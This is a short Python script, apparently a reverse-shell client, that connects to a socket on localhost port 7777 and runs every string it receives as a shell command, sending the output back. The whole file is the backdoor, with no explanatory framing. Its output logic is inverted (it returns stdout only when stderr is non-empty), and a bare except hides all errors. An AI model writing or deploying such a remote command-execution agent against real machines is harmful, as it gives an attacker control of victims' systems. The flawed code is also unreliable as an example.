import socket
import subprocess


def main():
    client = socket.socket()
    try:
        client.connect(('localhost', 7777))
        client.send('1')
        while True:
            option = client.recv(1024)
            command = subprocess.Popen(option, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            
            if command.stderr.read() != "":
                client.send(command.stdout.read())
            else:
                client.send(command.stderr.read())
    except:
        pass


if __name__ == '__main__':
    main()
    